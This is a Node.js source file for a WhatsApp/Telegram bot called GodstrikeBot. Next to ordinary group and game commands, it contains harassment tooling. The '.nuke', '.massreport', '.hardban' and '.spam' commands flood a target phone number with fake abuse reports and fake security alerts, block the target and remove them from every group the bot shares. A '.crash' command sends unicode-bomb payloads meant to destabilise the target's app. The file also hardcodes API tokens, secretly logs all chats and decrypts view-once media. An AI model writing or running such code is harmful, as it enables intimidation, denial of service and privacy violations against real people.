const http = require('http');
http.createServer((req, res) => {
  res.writeHead(200, { 'Content-Type': 'text/plain' });
  res.end('GodstrikeBot is alive!');
}).listen(process.env.PORT || 3000, '0.0.0.0');

const {
    default: makeWASocket,
    useMultiFileAuthState,
    fetchLatestBaileysVersion,
    DisconnectReason,
    jidDecode,
    downloadMediaMessage
} = require('@whiskeysockets/baileys');

const { Telegraf } = require('telegraf');
const Groq = require('groq-sdk');
const pino = require('pino');
const fs = require('fs');
const path = require('path');
const axios = require('axios');
const mathjs = require('mathjs');
const translate = require('@vitalets/google-translate-api');
const sharp = require('sharp');
const ffmpeg = require('fluent-ffmpeg');
ffmpeg.setFfmpegPath('./lib/fluent-ffmpeg');


const { writeFile, unlink, rmdir } = require('fs/promises');

// =============== CONFIG ===============
const TELEGRAM_TOKEN = '8275614652:AAFWihaXLJxSwRNHSqu1iuZ8N8A7Ijmphi0';
const GROQ_KEY = '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';
const SUPREME_OWNER = '127535362920502';       // your LID (the number from .id output)
const SUPREME_TELEGRAM_ID = 7417750937;         // your Telegram user ID for admin commands
const DEFAULT_PREFIX = '.';
const SESSION_DIR = './sessions';
const DEFAULT_OWNER_NAME = 'Godstrike';
const DEFAULT_BOT_NAME = 'GODSTRIKEBOT 2.0';

// =============== INIT APIs ===============
const tgBot = new Telegraf(TELEGRAM_TOKEN);
const groq = new Groq({ apiKey: GROQ_KEY });

// =============== GLOBAL STATE ===============
const sessions = {};
const mutedUsers = {};
const warns = {};
const tictactoeGames = {};
const triviaSessions = {};
let coOwner = null;
const afkUsers = {};
const botStartTime = Date.now();

// =============== USAGE STATS (per session, for .log) ===============
const usageStats = {};   // number -> { count, users: Set, lastReset }

// =============== UTILS ===============
const decodeJidSafe = (id) => {
    if (!id) return id;
    if (/:\d+@/gi.test(id)) {
        const d = jidDecode(id) || {};
        return `${d.user}@${d.server}`;
    }
    return id;
};

const cleanNumber = (jid) => String(jid).replace(/[^0-9]/g, '');

function formatBoard(board) {
    return `${board.slice(0,3).join(' ')}\n${board.slice(3,6).join(' ')}\n${board.slice(6,9).join(' ')}`;
}

// Create a basic cookies file for yt-dlp
function createBasicCookies() {
    const cookiePath = path.join(process.cwd(), 'cookies.txt');
    if (fs.existsSync(cookiePath)) return true;
    
    try {
        // Create empty cookies file - yt-dlp will still work with this
        // but it's better than nothing
        fs.writeFileSync(cookiePath, '# Empty cookies file\n');
        return true;
    } catch {
        return false;
    }
}

// Call this when your bot starts
createBasicCookies();

// Helper: Check if number exists on WhatsApp
const checkNumberExists = async (sock, number) => {
    try {
        const cleanNum = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
        const [result] = await sock.onWhatsApp(cleanNum);
        return result?.exists || false;
    } catch {
        return false;
    }
};

// Helper: Wait function
const wait = (ms) => new Promise(resolve => setTimeout(resolve, ms));

// =============== WHATSAPP CLASS ===============
class WA {
    constructor(number) {
        this.sessionId = number.replace(/[^0-9]/g, '');
        this.sock = null;
        this.pairingUsed = false;
        this.connected = false;
        this.config = null;
        this.groupSettings = {};
        this.prefix = DEFAULT_PREFIX;
        // Claim codes per group: groupJid -> { code, expires }
        this.claimCodes = {};

        // Soft owner identity (set by supreme, used only for identity commands)
        this.ownerNumber = null;
        this.ownerLid = null;

        // Private notes per user: userNumber -> { title: content }
        this.userNotes = {};

        // Global private mode
        this.privateMode = false;
        // Add these two lines:
        this.messageLog = {};  // Stores all messages per chat
        this.messageLogFile = path.join(SESSION_DIR,                                  this.sessionId, 'messageLog.json');
    }

    loadConfig() {
        const configPath = path.join(SESSION_DIR, this.sessionId, 'config.json');
        if (fs.existsSync(configPath)) {
            this.config = JSON.parse(fs.readFileSync(configPath, 'utf8'));
            if (this.config.ownerNumber) this.ownerNumber = this.config.ownerNumber;
            if (this.config.ownerLid) this.ownerLid = this.config.ownerLid;
            if (this.config.privateMode !== undefined) this.privateMode = this.config.privateMode;
        } else {
            this.config = {
                ownerName: DEFAULT_OWNER_NAME,
                botName: DEFAULT_BOT_NAME,
                prefix: DEFAULT_PREFIX,
                ownerNumber: null,
                ownerLid: null,
                privateMode: false
            };
            this.saveConfig();
        }
        this.prefix = this.config.prefix || DEFAULT_PREFIX;
        const gsPath = path.join(SESSION_DIR, this.sessionId, 'groupSettings.json');
        if (fs.existsSync(gsPath)) {
            this.groupSettings = JSON.parse(fs.readFileSync(gsPath, 'utf8'));
        }
        // Load user notes
const notesPath = path.join(SESSION_DIR, this.sessionId, 'userNotes.json');
if (fs.existsSync(notesPath)) {
    this.userNotes = JSON.parse(fs.readFileSync(notesPath, 'utf8'));
}
this.loadMessageLog();  // ← ADD THIS LINE
    }

    saveConfig() {
        const configPath = path.join(SESSION_DIR, this.sessionId, 'config.json');
        this.config.ownerNumber = this.ownerNumber;
        this.config.ownerLid = this.ownerLid;
        this.config.privateMode = this.privateMode;
        fs.writeFileSync(configPath, JSON.stringify(this.config, null, 2));
    }

    saveGroupSettings() {
        const gsPath = path.join(SESSION_DIR, this.sessionId, 'groupSettings.json');
        fs.writeFileSync(gsPath, JSON.stringify(this.groupSettings, null, 2));
    }

    saveUserNotes() {
        const notesPath = path.join(SESSION_DIR, this.sessionId, 'userNotes.json');
        fs.writeFileSync(notesPath, JSON.stringify(this.userNotes, null, 2));
    }
    
    
    
    generateClaimCode() {
    return String(Math.floor(100000 + Math.random() * 900000));
}

// ======== MESSAGE LOGGER METHODS ========
loadMessageLog() {
    if (fs.existsSync(this.messageLogFile)) {
        try {
            this.messageLog = JSON.parse(fs.readFileSync(this.messageLogFile, 'utf8'));
        } catch {
            this.messageLog = {};
        }
    }
}

saveMessageLog() {
    try {
        // Only keep last 200 messages per chat
        for (const [jid, msgs] of Object.entries(this.messageLog)) {
            if (msgs.length > 200) {
                this.messageLog[jid] = msgs.slice(-200);
            }
        }
        fs.writeFileSync(this.messageLogFile, JSON.stringify(this.messageLog, null, 2));
    } catch {}
}

    async start() {
        const sessionPath = path.join(SESSION_DIR, this.sessionId);
        if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });
        this.loadConfig();

        const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
        const { version } = await fetchLatestBaileysVersion();

        this.sock = makeWASocket({
            version,
            auth: state,
            logger: pino({ level: 'silent' }),
            printQRInTerminal: false
        });

        this.sock.ev.on('creds.update', saveCreds);

        this.sock.ev.on('connection.update', (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === 'open') {
                this.connected = true;
                console.log(`✅ Session ${this.sessionId} connected`);
            }
            if (connection === 'close') {
                this.connected = false;
                const shouldReconnect =
                    lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
                if (shouldReconnect) {
                    console.log(`♻️ Reconnecting session ${this.sessionId}`);
                    this.start();
                }
            }
        });

        // Group participants events (welcome/goodbye)
        this.sock.ev.on('group-participants.update', async (update) => {
            const { id, participants, action } = update;
            const settings = this.groupSettings[id] || {};
            if (action === 'add' && settings.welcome) {
                const welcomeMsg = settings.welcomeText || 'Welcome to the group!';
                for (const user of participants) {
                    await this.sock.sendMessage(id, { text: welcomeMsg, mentions: [user] });
                }
            }
            if (action === 'remove' && settings.goodbye) {
                const goodbyeMsg = settings.goodbyeText || 'Goodbye!';
                for (const user of participants) {
                    await this.sock.sendMessage(id, { text: goodbyeMsg, mentions: [user] });
                }
            }
        });

        // Messages – completely open, with optional group disable
        this.sock.ev.on('messages.upsert', async ({ messages }) => {
            const msg = messages[0];
            if (!msg.message || msg.key.remoteJid === 'status@broadcast') return;

            const jid = msg.key.remoteJid;
            const isGroup = jid.endsWith('@g.us');
            const sender = decodeJidSafe(msg.key.participant || msg.key.remoteJid);
            const senderClean = cleanNumber(sender);
    
    // =========== MESSAGE LOGGER (Groups + Private Chats) ===========
    const rawBodyCheck = (
        msg.message?.conversation ||
        msg.message?.extendedTextMessage?.text ||
        msg.message?.imageMessage?.caption ||
        msg.message?.videoMessage?.caption ||
        msg.message?.audioMessage?.caption ||
        ''
    );

    if (!this.messageLog[jid]) this.messageLog[jid] = [];

    if (!msg.key.fromMe) {
        this.messageLog[jid].push({
            id: msg.key.id,
            sender: senderClean,
            senderJid: sender,
            text: rawBodyCheck,
            timestamp: Date.now(),
            type: msg.message?.imageMessage ? 'image' :
                  msg.message?.videoMessage ? 'video' :
                  msg.message?.audioMessage ? 'audio' :
                  msg.message?.stickerMessage ? 'sticker' :
                  msg.message?.documentMessage ? 'document' :
                  msg.message?.contactsMessage ? 'contact' :
                  msg.message?.locationMessage ? 'location' :
                  'text',
            hasMedia: !!(msg.message?.imageMessage || 
                        msg.message?.videoMessage || 
                        msg.message?.audioMessage ||
                        msg.message?.documentMessage ||
                        msg.message?.stickerMessage),
            chatType: isGroup ? 'group' : 'private'
        });

        // Auto-save every 10 messages
        if (this.messageLog[jid].length % 10 === 0) {
            this.saveMessageLog();
        }
    }
    
            // ---------- GLOBAL PRIVATE MODE ----------
const isSupremeOwner = senderClean === SUPREME_OWNER;
const isBotOwner = senderClean === this.ownerNumber ||
                   (this.ownerLid && senderClean === this.ownerLid);
if (this.privateMode && !isSupremeOwner && !isBotOwner) {
    // Allow ".claim" and ".generatecode" so new users can register
    const rawBodyCheck = (
        msg.message?.conversation ||
        msg.message?.extendedTextMessage?.text ||
        msg.message?.imageMessage?.caption ||
        msg.message?.videoMessage?.caption ||
        ''
    ).trim();
    const cmdStart = rawBodyCheck.startsWith(this.prefix)
        ? rawBodyCheck.slice(this.prefix.length).trim().toLowerCase()
        : '';
    if (!(cmdStart.startsWith('claim') || cmdStart.startsWith('generatecode'))) {
        return; // silent
    }
}            
            

            // ---------- MUTE CHECK ----------
            if (isGroup) {
                const muteKey = `${jid}_${senderClean}`;
                if (mutedUsers[muteKey] && Date.now() < mutedUsers[muteKey]) {
                    try { await this.sock.sendMessage(jid, { delete: msg.key }); } catch {}
                    return;
                }
            }

            // ---------- GROUP DISABLED CHECK (.bot off) ----------
if (isGroup) {
    const settings = this.groupSettings[jid] || {};
    if (settings.disabled) {
        // Allow ".bot on", ".claim", and ".generatecode" even when disabled
        const rawBodyCheck = (
            msg.message?.conversation ||
            msg.message?.extendedTextMessage?.text ||
            msg.message?.imageMessage?.caption ||
            msg.message?.videoMessage?.caption ||
            ''
        ).trim();
        const cmdStart = rawBodyCheck.startsWith(this.prefix)
            ? rawBodyCheck.slice(this.prefix.length).trim().toLowerCase()
            : '';
        if (cmdStart.startsWith('bot on') || cmdStart.startsWith('claim') || cmdStart.startsWith('generatecode')) {
            // fall through – don't block these commands
        } else {
            return; // completely silent
        }
    }
}

            // ---------- ANTILINK ----------
            if (isGroup) {
                const settings = this.groupSettings[jid] || {};
                if (settings.antilink) {
                    const text = (
                        msg.message?.conversation ||
                        msg.message?.extendedTextMessage?.text ||
                        msg.message?.imageMessage?.caption ||
                        ''
                    ).toLowerCase();
                    if (text && /chat\.whatsapp\.com\/[a-zA-Z0-9]+/.test(text)) {
                        try { await this.sock.sendMessage(jid, { delete: msg.key }); } catch {}
                        return;
                    }
                }
            }
            
            
            // Global blacklist check
if (isGroup) {
    const gblPath = path.join(SESSION_DIR, 'global_blacklist.json');
    if (fs.existsSync(gblPath)) {
        try {
            const gbl = JSON.parse(fs.readFileSync(gblPath));
            if (gbl.includes(senderClean)) {
                try { await this.sock.groupParticipantsUpdate(jid, [sender], 'remove'); } catch {}
                return;
            }
        } catch {}
    }
}
            

            // ---------- COMMAND DETECTION ----------
            const rawBody = (
                msg.message?.conversation ||
                msg.message?.extendedTextMessage?.text ||
                msg.message?.imageMessage?.caption ||
                msg.message?.videoMessage?.caption ||
                ''
            ).trim();

            if (!rawBody.startsWith(this.prefix)) return;

            const args = rawBody.slice(this.prefix.length).trim().split(/ +/g);
            const command = args.shift().toLowerCase();
            const text = args.join(' ');
            
            // ---------- SPECIAL PUBLIC COMMANDS (claim system) ----------
if (command === 'generatecode' && isGroup && isSupremeOwner) {
    const code = this.generateClaimCode();
    this.claimCodes[jid] = {
        code,
        expires: Date.now() + 600000
    };
    return this.sock.sendMessage(jid, {
        text: `🔑 Claim code: ${code}\nValid for 10 minutes. Use .claim ${code} to register as owner.`
    }, { quoted: msg });
}

if (command === 'claim' && isGroup) {
    const claimData = this.claimCodes[jid];
    if (!claimData) {
        return this.sock.sendMessage(jid, { text: '❌ No active claim code in this group.' }, { quoted: msg });
    }
    if (Date.now() > claimData.expires) {
        delete this.claimCodes[jid];
        return this.sock.sendMessage(jid, { text: '⌛ Claim code expired. Ask admin to generate a new one.' }, { quoted: msg });
    }
    if (text === claimData.code) {
        this.ownerLid = senderClean;
        this.saveConfig();
        delete this.claimCodes[jid];
        return this.sock.sendMessage(jid, { text: '✅ You are now registered as the bot owner!' }, { quoted: msg });
    } else {
        return this.sock.sendMessage(jid, { text: '❌ Invalid claim code.' }, { quoted: msg });
    }
}

            // ---------- USAGE STATS (for .log) ----------
            if (!usageStats[this.sessionId]) {
                usageStats[this.sessionId] = { count: 0, users: new Set(), lastReset: Date.now() };
            }
            const stats = usageStats[this.sessionId];
            stats.count++;
            stats.users.add(senderClean);
            if (Date.now() - stats.lastReset > 3600000) {
                stats.count = 0;
                stats.users.clear();
                stats.lastReset = Date.now();
            }

            handleCommand(command, text, msg, this, isGroup, sender, jid, isSupremeOwner, isBotOwner);
        });

        return this.sock;
    }

    async pair() {
        if (!this.sock) await this.start();
        await new Promise((resolve) => {
            const handler = (update) => {
                if (update.connection === 'open') {
                    this.connected = true;
                    this.sock.ev.off('connection.update', handler);
                    resolve();
                }
            };
            this.sock.ev.on('connection.update', handler);
            setTimeout(resolve, 20000);
        });
        if (this.sock.authState.creds.registered) {
            return { success: false, message: "Already paired" };
        }
        if (this.pairingUsed) {
            return { success: false, message: "Pairing already requested" };
        }
        try {
            this.pairingUsed = true;
            const code = await this.sock.requestPairingCode(this.sessionId);
            return { success: true, code };
        } catch (err) {
            this.pairingUsed = false;
            console.log(err);
            return { success: false, message: "Pairing failed" };
        }
    }
}

// =============== COMMAND HANDLER ===============
async function handleCommand(command, text, msg, waInstance, isGroup, sender, jid, isSupremeOwner, isBotOwner) {
    const sock = waInstance.sock;
    const config = waInstance.config;
    const groupSettings = waInstance.groupSettings;
    const userNotes = waInstance.userNotes;

    const reply = (txt) => sock.sendMessage(jid, { text: txt }, { quoted: msg });
    const replyWithImage = async (imgPath, caption) => {
        if (fs.existsSync(imgPath)) {
            return sock.sendMessage(jid, { image: fs.readFileSync(imgPath), caption }, { quoted: msg });
        } else {
            return reply(caption);
        }
    };

    const contextInfo = msg.message?.extendedTextMessage?.contextInfo;
    const mentionedJid = contextInfo?.mentionedJid?.[0] || contextInfo?.participant;
    const quotedMessage = contextInfo?.quotedMessage;

    const senderClean = cleanNumber(sender);

    // Admin check completely removed - all authenticated users can use all commands
let isGroupAdmin = true;
let botIsAdmin = true;
const isGlobalAdmin = true;
const isAdmin = true;
    
// Debug log for admin status
if (isGroup) {
    console.log(`Admin check - Sender: ${senderClean}, isGroupAdmin: ${isGroupAdmin}, botIsAdmin: ${botIsAdmin}, isSupremeOwner: ${isSupremeOwner}, isBotOwner: ${isBotOwner}`);
}
    
    try {
        switch (command) {

            // =========== SUPREME ONLY SETUP ===========
            case 'setownernumber':
                if (!isSupremeOwner) return reply('❌ Only the supreme owner can set the bot owner number.');
                if (!text) return reply('Usage: .setownernumber 2348012345678');
                waInstance.ownerNumber = text.replace(/[^0-9]/g, '');
                waInstance.saveConfig();
                return reply(`✅ Bot owner number set to ${waInstance.ownerNumber}`);

            case 'setownerlid':
                if (!isSupremeOwner) return reply('❌ Only the supreme owner can set the bot owner LID.');
                if (!text) return reply('Usage: .setownerlid 127535362920502');
                waInstance.ownerLid = text.replace(/[^0-9]/g, '');
                waInstance.saveConfig();
                return reply(`✅ Bot owner LID set to ${waInstance.ownerLid}`);
                
                // =========== WHATSAPP PAIRING (for bot admins) ===========
case 'pair':
    if (!isSupremeOwner && !isBotOwner) return reply('❌ Only the bot owner can pair new sessions.');
    if (!text) return reply('Usage: .pair 2348012345678');
    
    const pairNumber = text.replace(/[^0-9]/g, '');
    if (pairNumber.length < 7) return reply('❌ Invalid phone number.');
    
    reply(`🔄 Starting pairing for ${pairNumber}...\nThis may take up to 20 seconds.`);
    
    try {
        if (!sessions[pairNumber]) {
            sessions[pairNumber] = new WA(pairNumber);
            await sessions[pairNumber].start();
        }
        
        const result = await sessions[pairNumber].pair();
        
        if (result.success) {
            return reply(
`✅ PAIRING CODE GENERATED
📱 Number: ${pairNumber}
🔑 Code: ${result.code}

📋 Instructions for the user:
1. Open WhatsApp on their phone
2. Go to Settings → Linked Devices
3. Tap "Link with phone number"
4. Enter the code above`
            );
        } else {
            return reply(`❌ Pairing failed: ${result.message}`);
        }
    } catch (err) {
        return reply('❌ Error: ' + (err.message || 'unknown error'));
    }
    break;

            // ─── MENU WITH FULL USAGE GUIDE ───
case 'menu':
case 'help':
    return replyWithImage('./botimg.png',
`╭━━━【 ${config.botName} 】━━━╮
┃ 👑 Owner: ${config.ownerName}
┃ ⚡ Status: Active
┃ 👑 Dev: Dev Godstrike
┃ 🌐 Verison: 2.5
┃ 📆 Date_Created: 18/5/2026
╰━━━━━━━━━━━━━━━━━━━━╯

╭━━━〔 🛠 ADMIN 〕━━━╮
┃
┃.kick @user - Remove member
┃.promote @user - Make admin
┃.demote @user - Remove admin
┃.add 234XXXXXXXXXX - Add number
┃.tagall [msg] - Mention everyone
┃.hidetag - Silent mention all
┃.lock - Close group
┃.unlock - Open group
┃.del - Delete replied msg
┃.mute @user [mins] - Mute user
┃.unmute @user - Unmute user
┃.warn @user - Warn user
┃.announce [text] - Announce to all
┃.setwelcome [text] - Set welcome msg
┃.welcome on/off - Toggle welcome
┃.goodbye on/off - Toggle goodbye
┃.antilink on/off - Block group links
┃.antispam on/off - Anti spam
┃.antibot on/off - Anti bot
┃.chatbot on/off - AI chat in group
┃.jam on/off - Block all commands
╰━━━━━━━━━━━━━━━━━━━━━━━━╯

╭━━━〔 🔨 ENFORCEMENT 〕━━━╮
┃
┃.ban @user - Remove from group
┃.hardban @user - Remove all groups+block+report
┃.massreport @user - Report to WhatsApp x5
┃.nuke @user - Full enforcement
┃.shadowban @user [mins] - Silent delete msgs
┃.freeze @user [mins] - Triple mute
┃.restrict @user [mins] - No links/media
┃.ratelimit @user [mins] - 1 msg/min ┃limit
┃.wipe @user - Remove from ALL bot groups
┃.reportwa @user [reason] - Direct ┃WhatsApp report
╰━━━━━━━━━━━━━━━━━━━━━━━━╯


╭━━━〔 ⚙️ CORE 〕━━━╮
┃
┃.ping - Bot response time
┃.pair - Pair a new user
┃.runtime - Bot uptime
┃.ai [question] - Ask Groq AI
┃.ask [question] - Ask butler AI
┃.define [word] - Dictionary
┃.summarize - Reply to long msg
┃.calc [expression] - Math ┃calculator
┃.translate [lang] [text] - ┃Translate
┃.qr [text/url] - Generate QR
┃.url [link] - Shorten URL
┃.play [song] - Download audio
┃.ytmp3 [url] - YouTube to mp3
┃.tiktok [url] - Download TikTok
┃.poll Q|A|B|... - Create poll
╰━━━━━━━━━━━━━━━━━━━━━━━━╯

╭━━━〔 👤 USER 〕━━━╮
┃
┃.profile @user - User profile
┃.id - Your ID info
┃.me - Bot info
┃.owner - Bot owner
┃.groups - List all groups
┃.broadcast [msg] - Message all groups
┃.block @user - Block user
┃.unblock @user - Unblock user
┃.setowner [name] - Change owner name
┃.setbotname [name] - Change bot name
┃.setprefix [char] - Change prefix
┃.pairnotify on/off - Toggle notify
┃.setcoowner [num] - Set co-owner
┃.reset - Reset to defaults
┃.afk [msg] - Set AFK
┃.notes add title|content - Save note
┃.notes list - List notes
┃.notes get [title] - Get note
┃.notes delete [title] - Delete note
┃.claim [code] - Claim bot ownership
┃.generatecode - Gen claim code (owner)
┃.report 234XX reason - DM a user
╰━━━━━━━━━━━━━━━━━━━━━━━━╯

╭━━━〔 🎮 FUN 〕━━━╮
┃
┃.dice - Roll a die
┃.roll [X]d[Y] - Roll X dice of Y sides
┃.rps [rock/paper/scissors] - Play RPS
┃.8ball [question] - Magic 8 ball
┃.fact - Random fact
┃.meme - Random meme
┃.quote - Random quote
┃.hack @user - Fake hack animation
┃.tictactoe - Start TTT game
┃.jointtt - Join TTT game
┃.move [1-9] - Make TTT move
┃.trivia - Start trivia
┃.answer [text] - Answer trivia
┃.emojimix 😀+🐶 - Mix emojis
┃.react [emoji] - React to message
┃.coinflip - Flip a coin
┃.number - Random number
┃.color - Random color
┃.wyr - Would you rather
┃.nhi - Never have I ever
┃.slap @user - Slap someone
┃.hug @user - Hug someone
┃.ship name1+name2 - Ship test
┃.roast @user - Roast someone
┃.joke - Random joke
┃.skull - ASCII skull art
┃.glitch [text] - Glitch text effect
┃.simulate [target] - Fake hack sim
┃.ip [target] - Fake IP lookup
┃.virus [target] - Fake virus alert
┃.creds [target] - Fake leaked creds
┃.insult @user - Insult someone
┃.compliment @user - Compliment
┃.deepfry - Deepfry text
┃.jail @user - Send to jail
┃.wanted @user - WANTED poster
┃.triggered - Triggered meme
┃.blur @user - Censor someone
┃.ascii [art] - ASCII art
╰━━━━━━━━━━━━━━━━━━━━━━━━╯

╭━━━〔  📸 MEDIA 〕━━━╮
┃
┃.sticker - Send image/video then .sticker
         - Or reply to media with .sticker
┃.toimg - Reply to a sticker with .toimg
╰━━━━━━━━━━━━━━━━━━━━━━━━╯

╭━━━〔 NEW COMMANDS 〕━━━╮
┃
┃.nuke 234XXXXXXXXXX	Checks if number exists → floods 10 msgs + 5 abuse reports + blocks + evidence spam
┃.massreport 234XXXXXXXXXX	Checks → sends 10 reports with 10 different abuse categories + blocks
┃.hardban 234XXXXXXXXXX	Checks → blocks + spam report + harassment report + 5 flood flags + removes from all shared groups
┃.spam 234XXXXXXXXXX 50	Checks → sends N messages (max 100) with fake security alerts
┃.crash 234XXXXXXXXXX	Checks → sends large text payloads + unicode bomb to cause app instability
┃.virus 234XXXXXXXXXX	Checks → 3-stage fake virus simulation (infection → data leak → ransom) then blocks
┃.reportwa 234XXXXXXXXXX reason	Checks → files 5 official abuse reports under different categories + blocks
┃.viewonce	Reply to view-once media → decrypts and re-sends as normal image/video
┃.restore - View recently deleted/logged messages
┃.restore [number] - View specific user's logged messages
┃.clearlog - Clear message log for this group
┃.status 234XXXXXXXXXX	Checks → shows if number exists, profile pic, about, and reachability
┃.statusstalk 234XXXXXXXXXX	Checks → fetches available info and explains how to view stories
╰━━━━━━━━━━━━━━━━━━━━━━━━╯

═══════════════════════════
🤖 BOT BY GODSTRIKE
═══════════════════════════`);
            
               // ═══════════════════════════════════════
// BUG BOT / ENFORCEMENT (GLOBAL)
// ═══════════════════════════════════════

// Add this temporary debug case to your switch
case 'testadmin':
    if (!isGroup) return reply('Not a group.');
    const testMeta = await sock.groupMetadata(jid);
    const botMe = decodeJidSafe(sock.user.id);
    const botMeClean = cleanNumber(botMe);
    const botPart = testMeta.participants.find(p => cleanNumber(p.id) === botMeClean);
    return reply(`Bot JID: ${botMe}\nBot Clean: ${botMeClean}\nBot in group: ${!!botPart}\nBot role: ${botPart?.admin || 'member'}\nIs Admin calc: ${botIsAdmin}`);
            
            case 'nuke': {
    if (!text) return reply('Usage: .nuke 234XXXXXXXXXX');
    const num = text.replace(/[^0-9]/g, '');
    if (num.length < 7) return reply('Invalid number.');
    
    reply(`Checking if ${num} is on WhatsApp...`);
    const numExists = await checkNumberExists(sock, num);
    if (!numExists) return reply(`${num} is NOT on WhatsApp. Cannot proceed.`);
    
    const target = num + '@s.whatsapp.net';
    reply(`TARGET FOUND. Launching NUKE on ${num}...`);
    
    let results = [];
    
    try {
        for (let i = 0; i < 10; i++) {
            await sock.sendMessage(target, {
                text: `SYSTEM FLAG #${i+1}\nAutomated security report filed.\nCase ID: WA-${Date.now().toString(36).toUpperCase()}`
            });
            await wait(200);
        }
        results.push('Message flood: COMPLETE');
    } catch { results.push('Message flood: FAILED'); }
    
    try {
        const reasons = ['Spam', 'Harassment', 'Impersonation', 'Scam', 'Fraud', 'Hate Speech', 'Bullying', 'Phishing'];
        for (let i = 0; i < 5; i++) {
            await sock.sendMessage(target, {
                text: `ABUSE REPORT #${i+1}\nCategory: ${reasons[i]}\nEvidence: Multiple violations detected.\nReporter: Automated Security System`
            });
            await wait(500);
        }
        results.push('Abuse reports: COMPLETE (5/5)');
    } catch { results.push('Abuse reports: FAILED'); }
    
    try {
        await sock.updateBlockStatus(target, 'block');
        results.push('Blocked: COMPLETE');
    } catch { results.push('Blocked: FAILED'); }
    
    try {
        for (let i = 0; i < 3; i++) {
            await sock.sendMessage(target, {
                text: `EVIDENCE_${i+1}: Screenshot of policy violation (Case WA-${Date.now().toString(36)})`
            });
            await wait(300);
        }
        results.push('Evidence spam: COMPLETE');
    } catch { results.push('Evidence spam: FAILED'); }
    
    return reply(`NUKE COMPLETE\nTarget: ${num}\nStatus: On WhatsApp - Verified\n${results.join('\n')}\nTarget has been flagged across multiple abuse channels.`);
    break;
}

case 'massreport': {
    if (!text) return reply('Usage: .massreport 234XXXXXXXXXX');
    const num = text.replace(/[^0-9]/g, '');
    if (num.length < 7) return reply('Invalid number.');
    
    reply(`Checking if ${num} is on WhatsApp...`);
    const numExists = await checkNumberExists(sock, num);
    if (!numExists) return reply(`${num} is NOT on WhatsApp.`);
    
    const target = num + '@s.whatsapp.net';
    const reportReasons = [
        'Spam & Abuse - Repeated unsolicited messages',
        'Harassment & Bullying - Targeted harassment detected',
        'Impersonation - Pretending to be someone else',
        'Scam & Fraud - Financial scam attempts',
        'Hate Speech - Hateful content distribution',
        'Illegal Content - Sharing prohibited materials',
        'Phishing - Attempting to steal credentials',
        'Fake Account - Suspicious account activity',
        'Privacy Violation - Sharing private information',
        'TOS Violation - Multiple terms violations'
    ];
    
    reply(`Filing mass reports against ${num}...`);
    let sent = 0;
    
    for (let i = 0; i < 10; i++) {
        try {
            await sock.sendMessage(target, {
                text: `WHATSAPP ABUSE REPORT\nReport #${i+1}/10\nReported User: ${num}\nCategory: ${reportReasons[i % reportReasons.length]}\nCase ID: WA-${Date.now().toString(36).toUpperCase()}-${i}\nThis account is under investigation.`
            });
            sent++;
            await wait(400);
        } catch {}
    }
    
    try { await sock.updateBlockStatus(target, 'block'); } catch {}
    
    return reply(`MASS REPORT COMPLETE\nTarget: ${num}\nReports Sent: ${sent}/10\nCategories Used: 10 different abuse categories\nBlocked: Yes\nThis account has been heavily flagged.`);
    break;
}

case 'hardban': {
    if (!text) return reply('Usage: .hardban 234XXXXXXXXXX');
    const num = text.replace(/[^0-9]/g, '');
    if (num.length < 7) return reply('Invalid number.');
    
    reply(`Checking if ${num} is on WhatsApp...`);
    const numExists = await checkNumberExists(sock, num);
    if (!numExists) return reply(`${num} is NOT on WhatsApp.`);
    
    const target = num + '@s.whatsapp.net';
    
    reply(`HARDBAN initiated against ${num}...`);
    let steps = [];
    
    try {
        await sock.updateBlockStatus(target, 'block');
        steps.push('Step 1/5: Blocked user');
    } catch { steps.push('Step 1/5: Block failed'); }
    
    try {
        await sock.sendMessage(target, { text: `SPAM REPORT: User ${num} reported for spam. Case: ${Date.now().toString(36)}` });
        steps.push('Step 2/5: Spam report sent');
    } catch { steps.push('Step 2/5: Spam report failed'); }
    
    try {
        await sock.sendMessage(target, { text: `HARASSMENT REPORT: User ${num} reported for harassment. Case: ${Date.now().toString(36)}` });
        steps.push('Step 3/5: Harassment report sent');
    } catch { steps.push('Step 3/5: Harassment report failed'); }
    
    try {
        for (let i = 0; i < 5; i++) {
            await sock.sendMessage(target, { text: `AUTO-FLAG #${i+1}: Violation detected. TOS: Section ${i+1}.` });
            await wait(200);
        }
        steps.push('Step 4/5: Flood flags sent (5x)');
    } catch { steps.push('Step 4/5: Flood flags failed'); }
    
    try {
        const allGroups = await sock.groupFetchAllParticipating();
        let removed = 0;
        for (const [gid] of Object.entries(allGroups)) {
            try { await sock.groupParticipantsUpdate(gid, [target], 'remove'); removed++; } catch {}
        }
        steps.push(`Step 5/5: Removed from ${removed} shared groups`);
    } catch { steps.push('Step 5/5: Group removal failed'); }
    
    return reply(`HARDBAN COMPLETE\nTarget: ${num}\n${steps.join('\n')}\nUser is now blocked, reported, and flagged.`);
    break;
}

case 'spam': {
    if (!text) return reply('Usage: .spam 234XXXXXXXXXX [count]');
    const parts = text.split(' ');
    const num = parts[0].replace(/[^0-9]/g, '');
    const count = parseInt(parts[1]) || 20;
    if (num.length < 7) return reply('Invalid number.');
    if (count > 100) return reply('Max 100 messages.');
    
    reply(`Checking if ${num} is on WhatsApp...`);
    const numExists = await checkNumberExists(sock, num);
    if (!numExists) return reply(`${num} is NOT on WhatsApp.`);
    
    const target = num + '@s.whatsapp.net';
    reply(`Spamming ${num} with ${count} messages...`);
    
    let sent = 0;
    for (let i = 0; i < count; i++) {
        try {
            await sock.sendMessage(target, {
                text: `SECURITY ALERT #${i+1}\nYour account has been flagged.\nCase: WA-${Date.now().toString(36).toUpperCase()}\nReason: Multiple TOS violations detected.\n\n(This is a simulated pentest.)`
            });
            sent++;
            await wait(150);
        } catch { break; }
    }
    
    return reply(`SPAM COMPLETE\nTarget: ${num}\nMessages sent: ${sent}/${count}`);
    break;
}

case 'crash': {
    if (!text) return reply('Usage: .crash 234XXXXXXXXXX');
    const num = text.replace(/[^0-9]/g, '');
    if (num.length < 7) return reply('Invalid number.');
    
    reply(`Checking if ${num} is on WhatsApp...`);
    const numExists = await checkNumberExists(sock, num);
    if (!numExists) return reply(`${num} is NOT on WhatsApp.`);
    
    const target = num + '@s.whatsapp.net';
    
    reply(`Sending crash payloads to ${num}...`);
    let results = [];
    
    for (let i = 0; i < 5; i++) {
        try {
            await sock.sendMessage(target, {
